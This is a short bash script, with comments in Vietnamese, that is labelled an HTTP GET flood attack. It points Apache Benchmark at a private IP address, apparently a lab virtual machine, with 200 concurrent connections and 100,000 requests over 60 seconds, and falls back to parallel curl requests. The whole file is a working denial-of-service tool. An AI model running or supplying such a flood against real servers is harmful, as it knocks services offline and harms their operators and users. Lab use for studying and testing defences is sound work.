#!/bin/bash
# Kich ban tan cong HTTP GET Flood
VICTIM=10.0.2.10
DURATION=60

echo "Bat dau HTTP Flood vao $VICTIM trong $DURATION giay..."
# Dung ab (Apache Benchmark) thay vi wrk (thuong khong co tren VM)
timeout $DURATION ab -c 200 -n 100000 http://$VICTIM/ 2>/dev/null || \
timeout $DURATION curl -s --parallel --parallel-max 50 http://$VICTIM/ > /dev/null 2>&1
echo "Hoan tat tan cong HTTP Flood!"
